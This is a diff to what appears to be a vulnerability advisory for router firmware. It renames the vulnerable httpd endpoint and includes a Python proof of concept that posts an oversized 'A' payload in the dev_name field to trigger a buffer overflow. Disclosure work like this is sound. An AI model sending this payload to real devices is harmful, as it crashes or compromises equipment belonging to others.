@@ -6,7 +6,7 @@ version: V15.03.06.51
 
 ## Description:
 
-There is a buffer overflow in httpd/formSetDeviceName
+There is a buffer overflow in httpd/SetDeviceName
 
 ## Source:
 
@@ -29,7 +29,7 @@ finally call snprint ,dont check the length ,cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetDeviceName"
+url = "http://192.168.1.13/goform/SetDeviceName"
 payload = 'A'*0x1000 + '\n'
 
 r = requests.post(url, data={'dev_name': payload})
